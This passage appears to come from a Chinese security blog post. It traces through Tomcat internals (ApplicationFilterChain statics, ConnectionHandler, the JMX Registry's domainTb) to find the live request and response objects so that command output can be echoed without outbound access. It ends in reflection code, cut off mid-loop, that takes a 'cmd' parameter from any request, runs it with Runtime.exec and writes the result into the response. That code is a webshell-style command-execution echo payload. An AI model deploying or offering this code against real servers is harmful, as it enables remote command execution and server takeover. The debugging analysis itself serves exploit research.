title="修改程序逻辑，初始化静态变量"></a>修改程序逻辑，初始化静态变量</h2><p>起一个Tomcat，在Controller打断点。然后<strong>回看</strong>调用栈。</p><p>寻找思路：找一个存放了<code>response</code>的Static变量，这样程序全局都可以使用到他。</p><p>定位到 <em>ApplicationFilterChain#internalDoFilter()</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">ApplicationFilterChain</span> <span class="keyword">implements</span> <span class="title">FilterChain</span>, <span class="title">CometFilterChain</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//存在静态变量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;ServletRequest&gt; lastServicedRequest;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;ServletResponse&gt; lastServicedResponse;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The int which is used to maintain the current position </span></span><br><span class="line"><span class="comment">     * in the filter chain.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> pos = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The int which gives the current number of filters in the chain.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    .....</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">internalDoFilter</span><span class="params">(ServletRequest request, </span></span></span><br><span class="line"><span class="function"><span class="params">                                  ServletResponse response)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//如果有自定义的Filter，优先执行</span></span><br><span class="line">        <span class="keyword">if</span> (pos &lt; n) &#123;</span><br><span class="line">            ...</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        .....</span><br><span class="line">        <span class="comment">//若ApplicationDispatcher.WRAP_SAME_OBJECT为true</span></span><br><span class="line">        <span class="comment">//将request和response塞入静态变量中</span></span><br><span class="line">        <span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">            lastServicedRequest.set(request);</span><br><span class="line">            lastServicedResponse.set(response);</span><br><span class="line">        &#125;</span><br><span class="line">        .....</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>缺点：</strong>使用Shiro这种另外走自定义Filter的。如果没继续 <code>chain.doFilter(request, response);</code>的操作，就会调用到<code>if (ApplicationDispatcher.WRAP_SAME_OBJECT)</code>语句块。</p><p><strong>操作：</strong></p><p>通过反射修改<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>为<code>true</code>，即可让Tomcat将request和response存入静态变量<code>lastServicedRequest</code>。</p><p>这里有个小坑：<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>是<code>final</code>类型的，我们需要先通过反射，将其<code>final</code>属性抹掉，才能正常通过反射设置值。关于抹掉<code>final</code>属性的文在这 <a href="https://glp2ex.yuque.com/glp2ex/pgf4ei/tl2o1w">反射修改final属性</a></p><h2 id="全局存储"><a href="#全局存储" class="headerlink" title="全局存储"></a>全局存储</h2><p>直接用的话，获取路径为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Thread.currentThread().getContextClassLoader() -&gt; ParallelWebappClassLoader -&gt; StandardRoot -&gt; StandardContext -&gt; ApplicationContext -&gt; StandardService -&gt; Connector -&gt; Http11NioProtocol -&gt; AbstractProtocol$ConnectionHandler -&gt; RequestGroupInfo -&gt; RequestInfo -&gt; Request -&gt; Response</span><br></pre></td></tr></table></figure><p>从<code>Thread.currentThread().getContextClassLoader()</code>到<code>ApplicationContext</code>的阶段，都是线程类加载器处理的。所以我们不需要关心。真正需要关心的是<code>StandardService</code>之后的，是如何获取的。</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3">原作者</a>的这篇文也把他寻找的思路写出来了。讲的挺清楚了。下文都是我跟着调时记的笔记</p><p>思路：找到存放<code>response</code>的类。跟调用栈，看<strong>最终存储</strong>到哪。最后用线程上下文加载器来拿到这个类</p><p>找到一个存放response的类：<code>Http11Processor</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Http11Processor.Response - 原因：<span class="keyword">final</span>，不会被修改</span><br></pre></td></tr></table></figure><p>开Java Web项目，断点打在控制器。<strong>看调用栈</strong>。创建<code>Http11Processor</code>的操作就在<code>AbstractProtocol#process()</code></p><p>此时的思路是：寻找哪里存放了<code>Http11Processor</code>。</p><p>注意：找存储变量的操作。不一定在调用栈前，也不一定在调用栈后。前后我们都应该去翻一翻，看一看。</p><p>最佳方式是：找到变量最初的创建点，然后顺着看。如果变量是启动时创建的，那就看做参数传入函数时，有无对其进行操作。跟的太深不要紧，做好笔记就好了。</p><p><strong>Http11Processor的存储</strong></p><p><em>AbstractProtocol#process</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (processor == <span class="keyword">null</span>) &#123;</span><br><span class="line">    processor = getProtocol().createProcessor();</span><br><span class="line">    register(processor); <span class="comment">//[!]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><code>[!]</code>作用：</strong></p><ul><li><p>将<code>processor</code>里的<code>RequestInfo request.reqProcessorMX</code>塞入**<code>RequestGroupInfo AbstractProtocol$ConnectionHandler.global</code>**</p></li><li><p><code>RequestInfo request.reqProcessorMX</code>存在<code>org.apache.coyote.Request req</code>字段。里头有<code>response</code></p></li></ul><p>既然<code>Http11Processor</code>被存储到<code>AbstractProtocol$ConnectionHandler.global</code>中，接下来就找哪里存放了<code>AbstractProtocol$ConnectionHandler</code>。这是一个内部类。一般都会被外面的类的属性保存。</p><p>Tomcat中，<code>AbstractProtocol</code>存放内部类<code>ConnectionHandler</code>的属性是<code>handler</code></p><p>所以接下来的思路是，找<code>AbstractProtocol</code>的存储点。不过需要注意的是，这是一个抽象类。所以寻找存储点时，应该寻找的是其子类。</p><p>继承关系如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">AbstractProtocol (org.apache.coyote)</span><br><span class="line">AbstractAjpProtocol (org.apache.coyote.ajp)</span><br><span class="line">AjpNioProtocol (org.apache.coyote.ajp)</span><br><span class="line">AjpAprProtocol (org.apache.coyote.ajp)</span><br><span class="line">AjpNio2Protocol (org.apache.coyote.ajp)</span><br><span class="line">AbstractHttp11Protocol (org.apache.coyote.http11)</span><br><span class="line">AbstractHttp11JsseProtocol (org.apache.coyote.http11)</span><br><span class="line">Http11AprProtocol (org.apache.coyote.http11)</span><br></pre></td></tr></table></figure><p>这里需要提一下，由于又很多类实例是在Tomcat启动时，就已经初始化好了，所以我们不需要挠破脑子想变量哪里被创建，哪里被赋值。我们目的是找存储点。找到即可，不然会越陷越深。</p><p><strong>Http11AprProtocol的存储</strong></p><p>跟着调用栈，技巧是只看Debug栏中的类属性。如果属性中有存放我们想找的类的实例，就去深入探究下大概的赋值链。</p><p><em>AbstractProcessorLight#process</em> 下一个调用点是<em>Http11Processor#service</em>。这是processor里的方法。</p><p><code>Http11Processor</code>有趣的属性如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">protocol = &#123;org.apache.coyote.http11.Http11NioProtocol@<span class="number">3161</span>&#125; </span><br><span class="line"> handler = &#123;org.apache.coyote.AbstractProtocol$ConnectionHandler@<span class="number">3153</span>&#125; </span><br><span class="line"></span><br><span class="line">inputBuffer = &#123;org.apache.coyote.http11.Http11InputBuffer@<span class="number">3731</span>&#125; </span><br><span class="line"> request = &#123;org.apache.coyote.Request@<span class="number">3728</span>&#125; </span><br><span class="line"></span><br><span class="line">outputBuffer = &#123;org.apache.coyote.http11.Http11OutputBuffer@<span class="number">3732</span>&#125; </span><br><span class="line"> response = &#123;org.apache.coyote.Response@<span class="number">3729</span>&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">adapter = &#123;org.apache.catalina.connector.CoyoteAdapter&#125; </span><br><span class="line"> connector = &#123;org.apache.catalina.connector.Connector&#125;</span><br><span class="line">  protocolHandler = &#123;org.apache.coyote.http11.Http11NioProtocol&#125; </span><br><span class="line">  mserver = &#123;com.sun.jmx.mbeanserver.JmxMBeanServer&#125; </span><br><span class="line">  service = &#123;org.apache.catalina.core.StandardService&#125;</span><br><span class="line"></span><br><span class="line">userDataHelper = &#123;org.apache.tomcat.util.log.UserDataHelper@<span class="number">3730</span>&#125; </span><br><span class="line"> log = &#123;org.apache.juli.logging.DirectJDKLog@<span class="number">3267</span>&#125; </span><br><span class="line">  logger = &#123;java.util.logging.Logger@<span class="number">3798</span>&#125; </span><br><span class="line">   manager = &#123;ClassLoaderLogManager@<span class="number">3799</span>&#125; </span><br><span class="line">    &#123;ParallelWebappClassLoader&#125;  -&gt; &#123;ClassLoaderLogManager$ClassLoaderLogInfo&#125; </span><br><span class="line">    &#123;RLClassLoader&#125;  -&gt; &#123;ClassLoaderLogManager$ClassLoaderLogInfo&#125; </span><br><span class="line">    &#123;ParallelWebappClassLoader&#125;  -&gt; &#123;ClassLoaderLogManager$ClassLoaderLogInfo&#125; </span><br><span class="line">    &#123;Launcher$AppClassLoader&#125;  -&gt; &#123;ClassLoaderLogManager$ClassLoaderLogInfo&#125; </span><br><span class="line"></span><br><span class="line">入参有个`socketWrapper`，里头有socket数据。不知道可不可以利用</span><br><span class="line">入参被包裹进`outputBuffer`了</span><br></pre></td></tr></table></figure><p>找到了有趣属性，就往调用点前/后去找，有无队这些属性进行保存等操作</p><p>在*CoyoteAdapter#service()*中。<code>connector.protocolHandler</code>存放了上文的protocol。最后Tomcat启动时会将<code>connector</code>放入<code>StandardContext</code>。Tomcat8+可以通过currentThread获取到<code>StandardContext</code></p><p>ps:</p><p><em>AbstractProcessor.response</em> 也是response</p><h3 id="记个没用东西"><a href="#记个没用东西" class="headerlink" title="记个没用东西"></a>记个没用东西</h3><p>Tomcat写文件。不知道路径的情况下，可以使用<code>org.apache.coyote.http11.Http11Protocol.log</code>下的<code>logger.manager.classLoaderLoggers</code>。这里有很多classLoader。还会记录路径</p><p>Tomcat7 - 9。都可用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">org.apache.coyote.http11.Http11Protocol.log = &#123;org.apache.juli.logging.DirectJDKLog&#125; </span><br><span class="line"> logger = &#123;java.util.logging.Logger&#125; </span><br><span class="line">  manager = &#123;org.apache.juli.ClassLoaderLogManager&#125; </span><br><span class="line">   classLoaderLoggers = &#123;java.util.WeakHashMap&#125;  size = <span class="number">4</span></span><br><span class="line">     key = &#123;org.apache.catalina.loader.WebappClassLoader&#125; </span><br><span class="line">      antiJARLocking = <span class="keyword">false</span></span><br><span class="line">      resources = &#123;org.apache.naming.resources.ProxyDirContext&#125; </span><br><span class="line">       proxy = &#123;org.apache.naming.resources.ProxyDirContext&#125; </span><br><span class="line">       env = &#123;java.util.Hashtable&#125;  size = <span class="number">2</span></span><br><span class="line">       dirContext = &#123;org.apache.naming.resources.FileDirContext&#125; </span><br><span class="line">        base = &#123;java.io.File&#125; </span><br><span class="line">        absoluteBase = <span class="string">&quot;D:\ide\env\tomcat\apache-tomcat-7.0.8\webapps\manager&quot;</span> <span class="comment">//[!]</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">org.apache.coyote.http11.Http11Protocol.log = &#123;org.apache.juli.logging.DirectJDKLog&#125; </span><br><span class="line"> logger = &#123;java.util.logging.Logger&#125; </span><br><span class="line">  manager = &#123;org.apache.juli.ClassLoaderLogManager&#125; </span><br><span class="line">   classLoaderLoggers = &#123;java.util.WeakHashMap&#125;  size = <span class="number">4</span></span><br><span class="line">     key = &#123;org.apache.catalina.loader.StandardClassLoader&#125; </span><br><span class="line">     value = &#123;org.apache.juli.ClassLoaderLogManager$ClassLoaderLogInfo&#125; </span><br><span class="line">      rootNode = &#123;org.apache.juli.ClassLoaderLogManager$LogNode&#125; </span><br><span class="line">       logger = &#123;org.apache.juli.ClassLoaderLogManager$RootLogger&#125; </span><br><span class="line">        manager = &#123;org.apache.juli.ClassLoaderLogManager&#125; </span><br><span class="line">        name = <span class="string">&quot;&quot;</span></span><br><span class="line">        handlers = &#123;java.util.concurrent.CopyOnWriteArrayList&#125;  size = <span class="number">2</span> <span class="comment">//[!]</span></span><br><span class="line">         <span class="number">0</span> = &#123;org.apache.juli.FileHandler&#125; </span><br><span class="line">          date = <span class="string">&quot;2021-12-09&quot;</span></span><br><span class="line">          directory = <span class="string">&quot;C:\Users\e\AppData\Local\JetBrains\IntelliJIdea2021.2\tomcat\2b72dbbd-2f54-48a6-9ed1-18ebe03347fa/logs&quot;</span></span><br></pre></td></tr></table></figure><p>那么，我们也可以通过写文件的方式，写入到 ？？？？？</p><p>Adpter是启动时就已经设置好了的</p><h2 id="Tomcat7-另一个静态变量"><a href="#Tomcat7-另一个静态变量" class="headerlink" title="* Tomcat7 另一个静态变量"></a>* Tomcat7 另一个静态变量</h2><p>李三师傅提出来的。原文：<a href="http://redteam.today/2020/04/09/tomcat%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E8%BF%9E%E7%BB%AD%E5%89%A7%E7%AC%AC%E5%85%AD%E9%9B%86/">tomcat不出网回显连续剧第六集</a></p><p>这个相对于全局存储来说，还是比较好理解的哈哈哈。毕竟一个反射全解决了。</p><p>Tomcat对<code>processor</code>进行<code>register()</code>的操作和Tomcat8不太一样。具体代码在<code>Http11Protocol#createProcessor()</code>。其中有调用 *Http11Protocol#register()*的操作</p><p>在*Http11Protocol#register()*中。有下面这么一行。将<code>rp</code>丢进了<code>registerComponent()</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Registry.getRegistry(<span class="keyword">null</span>, <span class="keyword">null</span>).registerComponent(rp, rpName, <span class="keyword">null</span>);</span><br></pre></td></tr></table></figure><p>很明显的看到<code>Registry.getRegistry(null, null)</code>是一个静态调用。跟进去可以发现。其返回的就是<code>Registry.registry</code>静态属性。</p><p>那，如果接下来的<code>registerComponent()</code>逻辑中有将<code>rp</code>存入<code>Registry.registry</code>或其引用的类中，那么就可以通过<code>Registry.getRegistry(null, null)</code>静态调用，在Tomcat任意位置取到<code>response</code>了。下面我们要找的是在何处存储了<code>rp</code>。</p><p>跟进<code>registerComponent()</code>，可以找到将<code>RequestInfo rp</code>设置到静态变量的代码。调用栈如下：</p><p><em>寻找存储点的思路：高亮显示要被的变量<code>rp</code>，发现哪个方法有传入该变量，跟进分析</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">addMoiToTb:<span class="number">278</span>, Repository</span><br><span class="line">addMBean:<span class="number">440</span>, Repository</span><br><span class="line">registerWithRepository:<span class="number">1898</span>, DefaultMBeanServerInterceptor</span><br><span class="line">registerDynamicMBean:<span class="number">966</span>, DefaultMBeanServerInterceptor</span><br><span class="line">registerObject:<span class="number">900</span>, DefaultMBeanServerInterceptor</span><br><span class="line">registerMBean:<span class="number">324</span>, DefaultMBeanServerInterceptor</span><br><span class="line">registerMBean:<span class="number">522</span>, JmxMBeanServer</span><br><span class="line">registerComponent:<span class="number">749</span>, Registry</span><br><span class="line">register:<span class="number">272</span>, Http11Protocol$Http11ConnectionHandler</span><br></pre></td></tr></table></figure><p>最终在*Repository#addMoiToTb()*进行了存储操作。存入的是一个<code>map</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">addMoiToTb</span><span class="params">(<span class="keyword">final</span> DynamicMBean object,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">final</span> ObjectName name,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">final</span> String key,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">final</span> Map&lt;String,NamedObject&gt; moiTb,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">final</span> RegistrationContext context)</span> </span>&#123;</span><br><span class="line">    registering(context);</span><br><span class="line">    moiTb.put(key,<span class="keyword">new</span> NamedObject(name, object));<span class="comment">//存储操作</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>变量内容如下，我们需要用循环+判断，获取<code>RequestGroupInfo</code>类型的元素:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">moiTb = &#123;java.util.HashMap@<span class="number">2764</span>&#125;  size = <span class="number">37</span></span><br><span class="line"> <span class="string">&quot;name=&quot;</span>ajp-bio-<span class="number">8009</span><span class="string">&quot;,type=GlobalRequestProcessor&quot;</span></span><br><span class="line">  key = <span class="string">&quot;name=&quot;</span>ajp-bio-<span class="number">8009</span><span class="string">&quot;,type=GlobalRequestProcessor&quot;</span></span><br><span class="line">  value = &#123;com.sun.jmx.mbeanserver.NamedObject@<span class="number">2822</span>&#125; </span><br><span class="line">   name = &#123;javax.management.ObjectName@<span class="number">2902</span>&#125; </span><br><span class="line">   object = &#123;org.apache.tomcat.util.modeler.BaseModelMBean@<span class="number">2903</span>&#125; </span><br><span class="line">    ....</span><br><span class="line">    resource = &#123;org.apache.coyote.RequestGroupInfo@<span class="number">2910</span>&#125;  <span class="comment">//存在response的类型为RequestGroupInfo</span></span><br><span class="line">    resourceType = <span class="string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span></span><br><span class="line">    </span><br><span class="line"> <span class="string">&quot;type=StringCache&quot;</span> -&gt; &#123;com.sun.jmx.mbeanserver.NamedObject@<span class="number">2824</span>&#125; </span><br><span class="line">  key = <span class="string">&quot;type=StringCache&quot;</span></span><br><span class="line">  value = &#123;com.sun.jmx.mbeanserver.NamedObject@<span class="number">2824</span>&#125; </span><br><span class="line">   name = &#123;javax.management.ObjectName@<span class="number">2904</span>&#125; </span><br><span class="line">   object = &#123;org.apache.tomcat.util.modeler.BaseModelMBean@<span class="number">2905</span>&#125; </span><br><span class="line">.....</span><br><span class="line">    resource = &#123;org.apache.tomcat.util.buf.StringCache@<span class="number">2907</span>&#125; <span class="comment">//别的都是其他类型</span></span><br><span class="line">    resourceType = <span class="string">&quot;org.apache.tomcat.util.buf.StringCache&quot;</span></span><br></pre></td></tr></table></figure><p>获取<code>RequestGroupInfo</code>的存储链如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">org.apache.tomcat.util.modeler.Registry.registry</span><br><span class="line">-&gt; server</span><br><span class="line">    -&gt; mbsInterceptor</span><br><span class="line">    -&gt; repository</span><br><span class="line">    -&gt; domainTb</span><br><span class="line">    -&gt; <span class="string">&quot;Catalina&quot;</span></span><br><span class="line">    -&gt; <span class="string">&quot;name=\&quot;ajp-bio-8009\&quot;,type=GlobalRequestProcessor&quot;</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">org.apache.tomcat.util.modeler.Registry.registry.getMBeanServer()</span></span><br><span class="line"><span class="comment">反射拿mbsInterceptor</span></span><br><span class="line"><span class="comment">反射拿repository</span></span><br><span class="line"><span class="comment">反射拿domainTb</span></span><br><span class="line"><span class="comment">操作Map domainTb，拿`Catalina`的值</span></span><br><span class="line"><span class="comment">`Catalina`也是一个Map。遍历找到`RequestGroupInfo`类型，这就是存在response的对象</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">MBeanServer mBeanServer = Registry.getRegistry(<span class="keyword">null</span>, <span class="keyword">null</span>).getMBeanServer();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Field mbsInterceptorField = mBeanServer.getClass().getDeclaredField(<span class="string">&quot;mbsInterceptor&quot;</span>);</span><br><span class="line">    mbsInterceptorField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Object mbsInterceptor = mbsInterceptorField.get(mBeanServer);</span><br><span class="line"></span><br><span class="line">    Field repositoryField = mbsInterceptor.getClass().getDeclaredField(<span class="string">&quot;repository&quot;</span>);</span><br><span class="line">    repositoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Object repository = repositoryField.get(mbsInterceptor);</span><br><span class="line"></span><br><span class="line">    Field domainTbField = repository.getClass().getDeclaredField(<span class="string">&quot;domainTb&quot;</span>);</span><br><span class="line">    domainTbField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Map&lt;String,Map&lt;String, NamedObject&gt;&gt; domainTb = (Map) domainTbField.get(repository);</span><br><span class="line">    Map&lt;String, NamedObject&gt; catalina = domainTb.get(<span class="string">&quot;Catalina&quot;</span>);</span><br><span class="line">    Set&lt;String&gt; set = catalina.keySet();</span><br><span class="line">    <span class="keyword">for</span> (String key : set) &#123;</span><br><span class="line">        NamedObject namedObject = catalina.get(key);</span><br><span class="line">        <span class="comment">//一层层判断下去，防止报错</span></span><br><span class="line">        <span class="keyword">if</span>(namedObject.getObject().getClass().isAssignableFrom(BaseModelMBean.class))&#123;</span><br><span class="line">            BaseModelMBean baseModelMBean = (BaseModelMBean) namedObject.getObject();</span><br><span class="line">            <span class="keyword">if</span> (baseModelMBean.getManagedResource().getClass().isAssignableFrom(RequestGroupInfo.class)) &#123;</span><br><span class="line">                RequestGroupInfo requestGroupInfo = (RequestGroupInfo) baseModelMBean.getManagedResource();</span><br><span class="line">                <span class="comment">//判断下processors数量，有的是0，不是我们要找的</span></span><br><span class="line">                Field processorsField = requestGroupInfo.getClass().getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                processorsField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                ArrayList&lt;RequestInfo&gt; processors = (ArrayList) processorsField.get(requestGroupInfo);</span><br><span class="line">                <span class="keyword">for</span> (RequestInfo processor : processors) &#123;</span><br><span class="line">                    <span class="comment">//全部reponse都打上回显吧。免得有些回显不到</span></span><br><span class="line">                    Field reqField = processor.getClass().getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">                    reqField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    Request req = (Request) reqField.get(processor);</span><br><span class="line">                    Response response = req.getResponse();</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment">//Tomcat8 之后，OutputBuffer没法获取了。只能通过强行发射来拿</span></span><br><span class="line">                    OutputBuffer outputBuffer = response.getOutputBuffer();</span><br><span class="line">                    <span class="comment">//Field outputBufferFiled = response.getClass().getDeclaredField(&quot;outputBuffer&quot;);</span></span><br><span class="line">                    <span class="comment">//outputBufferFiled.setAccessible(true);</span></span><br><span class="line">                    <span class="comment">//OutputBuffer outputBuffer = (OutputBuffer) outputBufferFiled.get(response);</span></span><br><span class="line">                    </span><br><span class="line">                    ByteChunk byteChunk = <span class="keyword">new</span> ByteChunk();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//根据请求,命令执行和回显</span></span><br><span class="line">                    String cmd = req.getParameters().getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                    String echoEnable = req.getParameters().getParameter(<span class="string">&quot;echoEnable&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="string">&quot;true&quot;</span>.equals(echoEnable) &amp;&amp; cmd != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        InputStream execInputStream = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                        BufferedInputStream bufferedInputStream = <span class="keyword">new</span> BufferedInputStream(execInputStream);</span><br><span class="line">                        <span class="comment">//1Mb一段读取</span></span><br><span class="line">                        <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                        <span class="keyword">int</span> len;</span><br><span class="line">                        <span class="keyword">while</span>((len = bufferedInputStream.read(buffer)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                            byteChunk.append(buffer, <span class="number">0</span>, len);</span><br><span class="line">                        